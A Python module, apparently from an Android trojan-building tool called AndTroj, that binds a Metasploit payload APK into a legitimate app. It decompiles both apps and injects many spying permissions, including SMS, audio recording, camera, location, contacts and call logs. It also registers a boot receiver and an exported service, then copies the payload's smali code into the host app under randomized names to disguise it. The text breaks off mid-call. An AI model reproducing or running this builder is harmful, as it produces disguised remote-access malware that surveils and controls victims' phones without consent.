#!/usr/bin/env python
# coding=utf-8
# https://t.me/unk9vvn
# AVI
import subprocess, os
from core.start import rnd
from core.eng_menu import social_eng_menu



def apk_binder():
    global dir_package_app_two, dir_package_app_tree
    rnd_stage = rnd()
    rnd_Payload = rnd()
    rnd_MainService = rnd()
    rnd_MainBroadcastReceiver = rnd()
    Backslash = '\\'

    tmp = '/usr/share/AndTroj/tmp/'
    ORG = tmp + 'orgapp.apk'
    PLD = tmp + 'payload.apk'
    dir_ORG = tmp + 'orgapp'
    dir_PLD = tmp + 'payload'

    Persistence = tmp + 'persis.sh'
    name_payload = tmp + 'name_PYLD.txt'
    Android_Manifest = dir_ORG + '/AndroidManifest.xml'

    addr_package = tmp + 'addr_PKG.txt'
    addr_package_Modify = tmp + 'addr_PKG_MDY.txt'
    addr_package_Fixed = tmp + 'addr_PKG_FIX.txt'

    addr_allowBackup = tmp + 'addr_ALW.txt'
    addr_allowBackup_Modify = tmp + 'addr_ALW_MDY.txt'
    addr_allowBackup_Fixed = tmp + 'addr_ALW_FIX.txt'

    addr_Activity = tmp + 'addr_ACT.txt'
    addr_Activity_Modify = tmp + 'addr_ACT_MDY.txt'
    addr_Activity_Fixed = tmp + 'addr_ACT_BK_FIX.txt'

    addr_Owner = tmp + 'addr_Owner.txt'
    addr_dname = tmp + 'addr_dname.txt'
    addr_EDT = tmp + 'addr_EDT.txt'

    n = open(name_payload)
    raw_n = n.read()
    payload_n = raw_n.split('\n', 1)[0]
    payload_name = os.path.splitext("{0}".format(payload_n))[0]
    print "I: Using Input: " + payload_n + " ..."
    subprocess.call(
        'apktool -f d ' + ORG + ' -o ' + dir_ORG,
        shell=True)
    subprocess.call(
        'apktool -f d ' + PLD + ' -o ' + dir_PLD,
        shell=True)
    print "I: Adding all permissions..."
    if '<uses-permission android:name="android.permission.INTERNET"/>' in open(Android_Manifest).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.INTERNET"/>\' ' + Android_Manifest,
            shell=True)
    if '<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>' in open(Android_Manifest).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>\' ' + Android_Manifest,
            shell=True)
    if '<uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>' in open(Android_Manifest).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>\' ' + Android_Manifest,
            shell=True)
    if '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>' in open(Android_Manifest).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\' ' + Android_Manifest,
            shell=True)
    if '<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>' in open(Android_Manifest).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\' ' + Android_Manifest,
            shell=True)
    if '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>' in open(Android_Manifest).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\' ' + Android_Manifest,
            shell=True)
    if '<uses-permission android:name="android.permission.READ_PHONE_STATE"/>' in open(Android_Manifest).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\' ' + Android_Manifest,
            shell=True)
    if '<uses-permission android:name="android.permission.SEND_SMS"/>' in open(Android_Manifest).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.SEND_SMS"/>\' ' + Android_Manifest,
            shell=True)
    if '<uses-permission android:name="android.permission.RECEIVE_SMS"/>' in open(Android_Manifest).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\' ' + Android_Manifest,
            shell=True)
    if '<uses-permission android:name="android.permission.RECORD_AUDIO"/>' in open(Android_Manifest).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\' ' + Android_Manifest,
            shell=True)
    if '<uses-permission android:name="android.permission.CALL_PHONE"/>' in open(Android_Manifest).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.CALL_PHONE"/>\' ' + Android_Manifest,
            shell=True)
    if '<uses-permission android:name="android.permission.READ_CONTACTS"/>' in open(Android_Manifest).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_CONTACTS"/>\' ' + Android_Manifest,
            shell=True)
    if '<uses-permission android:name="android.permission.WRITE_CONTACTS"/>' in open(Android_Manifest).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\' ' + Android_Manifest,
            shell=True)
    if '<uses-permission android:name="android.permission.RECORD_AUDIO"/>' in open(Android_Manifest).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\' ' + Android_Manifest,
            shell=True)
    if '<uses-permission android:name="android.permission.WRITE_SETTINGS"/>' in open(Android_Manifest).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\' ' + Android_Manifest,
            shell=True)
    if '<uses-permission android:name="android.permission.CAMERA"/>' in open(Android_Manifest).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.CAMERA"/>\' ' + Android_Manifest,
            shell=True)
    if '<uses-permission android:name="android.permission.READ_SMS"/>' in open(Android_Manifest).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_SMS"/>\' ' + Android_Manifest,
            shell=True)
    if '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>' in open(Android_Manifest).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\' ' + Android_Manifest,
            shell=True)
    if '<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>' in open(Android_Manifest).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\' ' + Android_Manifest,
            shell=True)
    if '<uses-permission android:name="android.permission.SET_WALLPAPER"/>' in open(Android_Manifest).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.SET_WALLPAPER"/>\' ' + Android_Manifest,
            shell=True)
    if '<uses-permission android:name="android.permission.READ_CALL_LOG"/>' in open(Android_Manifest).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_CALL_LOG"/>\' ' + Android_Manifest,
            shell=True)
    if '<uses-permission android:name="android.permission.WRITE_CALL_LOG"/>' in open(Android_Manifest).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\' ' + Android_Manifest,
            shell=True)
    if '<uses-permission android:name="android.permission.WAKE_LOCK"/>' in open(Android_Manifest).read():
        pass
    else:
        subprocess.call(
            'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WAKE_LOCK"/>\' ' + Android_Manifest,
            shell=True)
    print "I: Injecting payload..."
    slash = '/'
    with open(addr_package_Fixed) as f:
        addr_package_read = f.read()
    for slashs in slash:
        count_slash = addr_package_read.count(slashs)
        if count_slash == 1:
            dir_package_app = addr_package_read.split('/')[0].split(' ')[0]
            dir_package_app_two = addr_package_read.split('/')[1].split(' ')[0]
            check_dir_package_app = os.path.exists('{0}/smali/{1}'.format(dir_ORG, dir_package_app))
            if check_dir_package_app == (False):
                os.system("mkdir {0}/smali/{1}".format(dir_ORG, dir_package_app))
                os.system("mkdir {0}/smali/{1}/{2}".format(dir_ORG, dir_package_app, dir_package_app_two))
                os.system("mkdir {0}/smali/{1}/{2}/{3}".format(dir_ORG, dir_package_app, dir_package_app_two, rnd_stage))
                subprocess.call(
                    'sed -i \'1s#.*#<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="' + dir_package_app + '.' + dir_package_app_two + '" platformBuildVersionCode="23" platformBuildVersionName="6.0">#\' ' + Android_Manifest,
                    shell=True)
                subprocess.call(
                    'sed -i \'s#</application>#    <receiver android:label=\"' + rnd_MainBroadcastReceiver + '\" android:name=\"' + dir_package_app + '.' + dir_package_app_two + '.' + rnd_stage + '.' + rnd_MainBroadcastReceiver + '\">\\n            <intent-filter>\\n                <action android:name=\"android.intent.action.BOOT_COMPLETED\"/>\\n            </intent-filter>\\n        </receiver>\\n        <service android:exported=\"true\" android:name="' + dir_package_app + '.' + dir_package_app_two + '.' + rnd_stage + '.' + rnd_MainService + '"/>\\n    </application>#g\' ' + Android_Manifest,
                    shell=True)
            else:
                check_dir_package_app = os.path.exists('{0}/smali/{1}/{2}'.format(dir_ORG, dir_package_app, dir_package_app_two))
                if check_dir_package_app == (False):
                    os.system("mkdir {0}/smali/{1}/{2}".format(dir_ORG, dir_package_app, dir_package_app_two))
                    os.system("mkdir {0}/smali/{1}/{2}/{3}".format(dir_ORG, dir_package_app, dir_package_app_two, rnd_stage))
                    subprocess.call(
                        'sed -i \'1s#.*#<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="' + dir_package_app + '.' + dir_package_app_two + '" platformBuildVersionCode="23" platformBuildVersionName="6.0">#\' ' + Android_Manifest,
                        shell=True)
                    subprocess.call(
                        'sed -i \'s#</application>#    <receiver android:label=\"' + rnd_MainBroadcastReceiver + '\" android:name=\"' + dir_package_app + '.' + dir_package_app_two + '.' + rnd_stage + '.' + rnd_MainBroadcastReceiver + '\">\\n            <intent-filter>\\n                <action android:name=\"android.intent.action.BOOT_COMPLETED\"/>\\n            </intent-filter>\\n        </receiver>\\n        <service android:exported=\"true\" android:name="' + dir_package_app + '.' + dir_package_app_two + '.' + rnd_stage + '.' + rnd_MainService + '"/>\\n    </application>#g\' ' + Android_Manifest,
                        shell=True)
                else:
                    os.system("mkdir {0}/smali/{1}/{2}/{3}".format(dir_ORG, dir_package_app, dir_package_app_two, rnd_stage))
                    subprocess.call(
                        'sed -i \'1s#.*#<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="' + dir_package_app + '.' + dir_package_app_two + '" platformBuildVersionCode="23" platformBuildVersionName="6.0">#\' ' + Android_Manifest,
                        shell=True)
                    subprocess.call(
                        'sed -i \'s#</application>#    <receiver android:label=\"' + rnd_MainBroadcastReceiver + '\" android:name=\"' + dir_package_app + '.' + dir_package_app_two + '.' + rnd_stage + '.' + rnd_MainBroadcastReceiver + '\">\\n            <intent-filter>\\n                <action android:name=\"android.intent.action.BOOT_COMPLETED\"/>\\n            </intent-filter>\\n        </receiver>\\n        <service android:exported=\"true\" android:name="' + dir_package_app + '.' + dir_package_app_two + '.' + rnd_stage + '.' + rnd_MainService + '"/>\\n    </application>#g\' ' + Android_Manifest,
                        shell=True)
            print "I: Obfuscating resource files..."
            subprocess.call(
                'cd ' + dir_PLD + '/smali/com/metasploit/stage/ && cp f.smali e.smali d.smali c.smali b.smali a.smali ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + rnd_stage + '/;cp -r ' + dir_PLD + '/smali/com/metasploit/stage/Payload.smali ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + rnd_stage + '/' + rnd_Payload + '.smali;cp -r ' + dir_PLD + '/smali/com/metasploit/stage/MainService.smali ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + rnd_stage + '/' + rnd_MainService + '.smali;cp -r ' + dir_PLD + '/smali/com/metasploit/stage/MainBroadcastReceiver.smali ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + rnd_stage + '/' + rnd_MainBroadcastReceiver + '.smali',
                shell=True)
            subprocess.call(
                'sed -i "s#metasploit/stage#' + dir_package_app_two + '/' + rnd_stage + '#g" ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + rnd_stage + '/*;sed -i "s#Payload#' + rnd_Payload + '#g" ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + rnd_stage + '/*;sed -i "s#MainService#' + rnd_stage + '/' + rnd_MainService + '#g" ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + rnd_stage + '/*;sed -i "s#MainBroadcastReceiver#' + rnd_stage + '/' + rnd_MainBroadcastReceiver + '#g" ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + rnd_stage + '/*',
                shell=True)
        elif count_slash == 2:
            dir_package_app = addr_package_read.split('/')[0].split(' ')[0]
            dir_package_app_two = addr_package_read.split('/')[1].split(' ')[0]
            dir_package_app_tree = addr_package_read.split('/')[2].split(' ')[0]
            check_dir_package_app = os.path.exists('{0}/smali/{1}'.format(dir_ORG, dir_package_app))
            if check_dir_package_app == (False):
                os.system("mkdir {0}/smali/{1}".format(dir_ORG, dir_package_app))
                os.system("mkdir {0}/smali/{1}/{2}".format(dir_ORG, dir_package_app, dir_package_app_two))
                os.system("mkdir {0}/smali/{1}/{2}/{3}".format(dir_ORG, dir_package_app, dir_package_app_two, dir_package_app_tree))
                os.system("mkdir {0}/smali/{1}/{2}/{3}/{4}".format(dir_ORG, dir_package_app, dir_package_app_two, dir_package_app_tree, rnd_stage))
                subprocess.call(
                    'sed -i \'1s#.*#<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '" platformBuildVersionCode="23" platformBuildVersionName="6.0">#\' ' + Android_Manifest,
                    shell=True)
                subprocess.call(
                    'sed -i \'s#</application>#    <receiver android:label=\"' + rnd_MainBroadcastReceiver + '\" android:name=\"' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '.' + rnd_stage + '.' + rnd_MainBroadcastReceiver + '\">\\n            <intent-filter>\\n                <action android:name=\"android.intent.action.BOOT_COMPLETED\"/>\\n            </intent-filter>\\n        </receiver>\\n        <service android:exported=\"true\" android:name="' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '.' + rnd_stage + '.' + rnd_MainService + '"/>\\n    </application>#g\' ' + Android_Manifest,
                    shell=True)
            else:
                check_dir_package_app = os.path.exists('{0}/smali/{1}/{2}'.format(dir_ORG, dir_package_app, dir_package_app_two))
                if check_dir_package_app == (False):
                    os.system("mkdir {0}/smali/{1}/{2}".format(dir_ORG, dir_package_app, dir_package_app_two))
                    os.system("mkdir {0}/smali/{1}/{2}/{3}".format(dir_ORG, dir_package_app, dir_package_app_two, dir_package_app_tree))
                    os.system("mkdir {0}/smali/{1}/{2}/{3}/{4}".format(dir_ORG, dir_package_app, dir_package_app_two, dir_package_app_tree, rnd_stage))
                    subprocess.call(
                        'sed -i \'1s#.*#<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '" platformBuildVersionCode="23" platformBuildVersionName="6.0">#\' ' + Android_Manifest,
                        shell=True)
                    subprocess.call(
                        'sed -i \'s#</application>#    <receiver android:label=\"' + rnd_MainBroadcastReceiver + '\" android:name=\"' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '.' + rnd_stage + '.' + rnd_MainBroadcastReceiver + '\">\\n            <intent-filter>\\n                <action android:name=\"android.intent.action.BOOT_COMPLETED\"/>\\n            </intent-filter>\\n        </receiver>\\n        <service android:exported=\"true\" android:name="' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '.' + rnd_stage + '.' + rnd_MainService + '"/>\\n    </application>#g\' ' + Android_Manifest,
                        shell=True)
                else:
                    check_dir_package_app = os.path.exists('{0}/smali/{1}/{2}/{3}'.format(dir_ORG, dir_package_app, dir_package_app_two, dir_package_app_tree))
                    if check_dir_package_app == (False):
                        os.system("mkdir {0}/smali/{1}/{2}/{3}".format(dir_ORG, dir_package_app, dir_package_app_two, dir_package_app_tree))
                        os.system("mkdir {0}/smali/{1}/{2}/{3}/{4}".format(dir_ORG, dir_package_app, dir_package_app_two, dir_package_app_tree, rnd_stage))
                        subprocess.call(
                            'sed -i \'1s#.*#<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '" platformBuildVersionCode="23" platformBuildVersionName="6.0">#\' ' + Android_Manifest,
                            shell=True)
                        subprocess.call(
                            'sed -i \'s#</application>#    <receiver android:label=\"' + rnd_MainBroadcastReceiver + '\" android:name=\"' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '.' + rnd_stage + '.' + rnd_MainBroadcastReceiver + '\">\\n            <intent-filter>\\n                <action android:name=\"android.intent.action.BOOT_COMPLETED\"/>\\n            </intent-filter>\\n        </receiver>\\n        <service android:exported=\"true\" android:name="' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '.' + rnd_stage + '.' + rnd_MainService + '"/>\\n    </application>#g\' ' + Android_Manifest,
                            shell=True)
                    else:
                        os.system("mkdir {0}/smali/{1}/{2}/{3}/{4}".format(dir_ORG, dir_package_app, dir_package_app_two, dir_package_app_tree, rnd_stage))
                        subprocess.call(
                            'sed -i \'1s#.*#<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '" platformBuildVersionCode="23" platformBuildVersionName="6.0">#\' ' + Android_Manifest,
                            shell=True)
                        subprocess.call(
                            'sed -i \'s#</application>#    <receiver android:label=\"' + rnd_MainBroadcastReceiver + '\" android:name=\"' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '.' + rnd_stage + '.' + rnd_MainBroadcastReceiver + '\">\\n            <intent-filter>\\n                <action android:name=\"android.intent.action.BOOT_COMPLETED\"/>\\n            </intent-filter>\\n        </receiver>\\n        <service android:exported=\"true\" android:name="' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '.' + rnd_stage + '.' + rnd_MainService + '"/>\\n    </application>#g\' ' + Android_Manifest,
                            shell=True)
            print "I: Obfuscating resource files..."
            subprocess.call(
                'cd ' + dir_PLD + '/smali/com/metasploit/stage/ && cp f.smali e.smali d.smali c.smali b.smali a.smali ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + dir_package_app_tree + '/' + rnd_stage + '/;cp -r ' + dir_PLD + '/smali/com/metasploit/stage/Payload.smali ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + dir_package_app_tree + '/' + rnd_stage + '/' + rnd_Payload + '.smali;cp -r ' + dir_PLD + '/smali/com/metasploit/stage/MainService.smali ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + dir_package_app_tree + '/' + rnd_stage + '/' + rnd_MainService + '.smali;cp -r ' + dir_PLD + '/smali/com/metasploit/stage/MainBroadcastReceiver.smali ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + dir_package_app_tree + '/' + rnd_stage + '/' + rnd_MainBroadcastReceiver + '.smali',
                shell=True)
            subprocess.call(
                'sed -i "s#metasploit/stage#' + dir_package_app_two + '/' + dir_package_app_tree + '/' + rnd_stage + '#g" ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + dir_package_app_tree + '/' + rnd_stage + '/*;sed -i "s#Payload#' + rnd_Payload + '#g" ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + dir_package_app_tree + '/' + rnd_stage + '/*;sed -i "s#MainService#' + rnd_stage + '/' + rnd_MainService + '#g" ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + dir_package_app_tree + '/' + rnd_stage + '/*;sed -i "s#MainBroadcastReceiver#' + rnd_stage + '/' + rnd_MainBroadcastReceiver + '#g" ' + dir_ORG + '/smali/' + dir_package_app + '/' + dir_package_app_two + '/' + dir_package_app_tree + '/' + rnd_stage + '/*',
                shell=True)
        elif count_slash == 3:
            dir_package_app = addr_package_read.split('/')[0].split(' ')[0]
            dir_package_app_two = addr_package_read.split('/')[1].split(' ')[0]
            dir_package_app_tree = addr_package_read.split('/')[2].split(' ')[0]
            dir_package_app_for = addr_package_read.split('/')[3].split(' ')[0]
            check_dir_package_app = os.path.exists('{0}/smali/{1}'.format(dir_ORG, dir_package_app))
            if check_dir_package_app == (False):
                os.system("mkdir {0}/smali/{1}".format(dir_ORG, dir_package_app))
                os.system("mkdir {0}/smali/{1}/{2}".format(dir_ORG, dir_package_app, dir_package_app_two))
                os.system("mkdir {0}/smali/{1}/{2}/{3}".format(dir_ORG, dir_package_app, dir_package_app_two, dir_package_app_tree))
                os.system("mkdir {0}/smali/{1}/{2}/{3}/{4}".format(dir_ORG, dir_package_app, dir_package_app_two, dir_package_app_tree, dir_package_app_for))
                os.system("mkdir {0}/smali/{1}/{2}/{3}/{4}/{5}".format(dir_ORG, dir_package_app, dir_package_app_two, dir_package_app_tree, dir_package_app_for, rnd_stage))
                subprocess.call(
                    'sed -i \'1s#.*#<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '.' + dir_package_app_for + '" platformBuildVersionCode="23" platformBuildVersionName="6.0">#\' ' + Android_Manifest,
                    shell=True)
                subprocess.call(
                    'sed -i \'s#</application>#    <receiver android:label=\"' + rnd_MainBroadcastReceiver + '\" android:name=\"' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '.' + dir_package_app_for + '.' + rnd_stage + '.' + rnd_MainBroadcastReceiver + '\">\\n            <intent-filter>\\n                <action android:name=\"android.intent.action.BOOT_COMPLETED\"/>\\n            </intent-filter>\\n        </receiver>\\n        <service android:exported=\"true\" android:name="' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '.' + dir_package_app_for + '.' + rnd_stage + '.' + rnd_MainService + '"/>\\n    </application>#g\' ' + Android_Manifest,
                    shell=True)
            else:
                check_dir_package_app = os.path.exists('{0}/smali/{1}/{2}'.format(dir_ORG, dir_package_app, dir_package_app_two))
                if check_dir_package_app == (False):
                    os.system("mkdir {0}/smali/{1}/{2}".format(dir_ORG, dir_package_app, dir_package_app_two))
                    os.system("mkdir {0}/smali/{1}/{2}/{3}".format(dir_ORG, dir_package_app, dir_package_app_two, dir_package_app_tree))
                    os.system("mkdir {0}/smali/{1}/{2}/{3}/{4}".format(dir_ORG, dir_package_app, dir_package_app_two, dir_package_app_tree, dir_package_app_for))
                    os.system("mkdir {0}/smali/{1}/{2}/{3}/{4}/{5}".format(dir_ORG, dir_package_app, dir_package_app_two, dir_package_app_tree, dir_package_app_for, rnd_stage))
                    subprocess.call(
                        'sed -i \'1s#.*#<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '.' + dir_package_app_for + '" platformBuildVersionCode="23" platformBuildVersionName="6.0">#\' ' + Android_Manifest,
                        shell=True)
                    subprocess.call(
                        'sed -i \'s#</application>#    <receiver android:label=\"' + rnd_MainBroadcastReceiver + '\" android:name=\"' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '.' + dir_package_app_for + '.' + rnd_stage + '.' + rnd_MainBroadcastReceiver + '\">\\n            <intent-filter>\\n                <action android:name=\"android.intent.action.BOOT_COMPLETED\"/>\\n            </intent-filter>\\n        </receiver>\\n        <service android:exported=\"true\" android:name="' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '.' + dir_package_app_for + '.' + rnd_stage + '.' + rnd_MainService + '"/>\\n    </application>#g\' ' + Android_Manifest,
                        shell=True)
                else:
                    check_dir_package_app = os.path.exists('{0}/smali/{1}/{2}/{3}'.format(dir_ORG, dir_package_app, dir_package_app_two, dir_package_app_tree))
                    if check_dir_package_app == (False):
                        os.system("mkdir {0}/smali/{1}/{2}/{3}".format(dir_ORG, dir_package_app, dir_package_app_two, dir_package_app_tree))
                        os.system("mkdir {0}/smali/{1}/{2}/{3}/{4}".format(dir_ORG, dir_package_app, dir_package_app_two, dir_package_app_tree, dir_package_app_for))
                        os.system("mkdir {0}/smali/{1}/{2}/{3}/{4}/{5}".format(dir_ORG, dir_package_app, dir_package_app_two, dir_package_app_tree, dir_package_app_for, rnd_stage))
                        subprocess.call(
                            'sed -i \'1s#.*#<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '.' + dir_package_app_for + '" platformBuildVersionCode="23" platformBuildVersionName="6.0">#\' ' + Android_Manifest,
                            shell=True)
                        subprocess.call(
                            'sed -i \'s#</application>#    <receiver android:label=\"' + rnd_MainBroadcastReceiver + '\" android:name=\"' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '.' + dir_package_app_for + '.' + rnd_stage + '.' + rnd_MainBroadcastReceiver + '\">\\n            <intent-filter>\\n                <action android:name=\"android.intent.action.BOOT_COMPLETED\"/>\\n            </intent-filter>\\n        </receiver>\\n        <service android:exported=\"true\" android:name="' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '.' + dir_package_app_for + '.' + rnd_stage + '.' + rnd_MainService + '"/>\\n    </application>#g\' ' + Android_Manifest,
                            shell=True)
                    else:
                        check_dir_package_app = os.path.exists('{0}/smali/{1}/{2}/{3}/{4}'.format(dir_ORG, dir_package_app, dir_package_app_two, dir_package_app_tree, dir_package_app_for))
                        if check_dir_package_app == (False):
                            os.system("mkdir {0}/smali/{1}/{2}/{3}/{4}".format(dir_ORG, dir_package_app, dir_package_app_two, dir_package_app_tree, dir_package_app_for))
                            os.system("mkdir {0}/smali/{1}/{2}/{3}/{4}/{5}".format(dir_ORG, dir_package_app, dir_package_app_two, dir_package_app_tree, dir_package_app_for, rnd_stage))
                            subprocess.call(
                                'sed -i \'1s#.*#<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '.' + dir_package_app_for + '" platformBuildVersionCode="23" platformBuildVersionName="6.0">#\' ' + Android_Manifest,
                                shell=True)
                            subprocess.call(
                                'sed -i \'s#</application>#    <receiver android:label=\"' + rnd_MainBroadcastReceiver + '\" android:name=\"' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '.' + dir_package_app_for + '.' + rnd_stage + '.' + rnd_MainBroadcastReceiver + '\">\\n            <intent-filter>\\n                <action android:name=\"android.intent.action.BOOT_COMPLETED\"/>\\n            </intent-filter>\\n        </receiver>\\n        <service android:exported=\"true\" android:name="' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '.' + dir_package_app_for + '.' + rnd_stage + '.' + rnd_MainService + '"/>\\n    </application>#g\' ' + Android_Manifest,
                                shell=True)
                        else:
                            os.system("mkdir {0}/smali/{1}/{2}/{3}/{4}/{5}".format(dir_ORG, dir_package_app, dir_package_app_two, dir_package_app_tree, dir_package_app_for, rnd_stage))
                            subprocess.call(
                                'sed -i \'1s#.*#<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '.' + dir_package_app_for + '" platformBuildVersionCode="23" platformBuildVersionName="6.0">#\' ' + Android_Manifest,
                                shell=True)
                            subprocess.call(
                                'sed -i \'s#</application>#    <receiver android:label=\"' + rnd_MainBroadcastReceiver + '\" android:name=\"' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '.' + dir_package_app_for + '.' + rnd_stage + '.' + rnd_MainBroadcastReceiver + '\">\\n            <intent-filter>\\n                <action android:name=\"android.intent.action.BOOT_COMPLETED\"/>\\n            </intent-filter>\\n        </receiver>\\n        <service android:exported=\"true\" android:name="' + dir_package_app + '.' + dir_package_app_two + '.' + dir_package_app_tree + '.' + rnd_stage + '.' + rnd_MainService + '"/>\\n    </application>#g\' ' + Android_Manifest,
                                shell=True)
            print "I: Obfuscating resource files..."
            subprocess.call(
